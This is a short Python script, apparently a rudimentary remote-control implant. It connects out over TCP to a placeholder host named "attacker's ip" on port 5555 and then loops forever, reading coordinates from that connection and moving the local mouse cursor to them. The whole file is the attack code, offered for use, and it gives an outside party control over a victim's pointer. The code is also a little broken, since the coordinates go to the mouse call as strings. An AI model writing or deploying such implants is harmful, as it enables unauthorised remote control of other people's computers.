from socket import *
import mouse
import pyautogui
from time import sleep
displaysize=pyautogui.size()
port = 5555

clientSock = socket(AF_INET, SOCK_STREAM)
clientSock.connect(("attacker's ip", port))

while True:
    recvData = clientSock.recv(1024)#300,300
    locate=recvData.decode('utf-8')
    locate=str(locate)
    var=[]
    var1=locate.split(",")
    var.append(var1[0])
    var.append(var1[1])
    mouse.move(var[0],var[1])
    sleep(0.1)
 	
    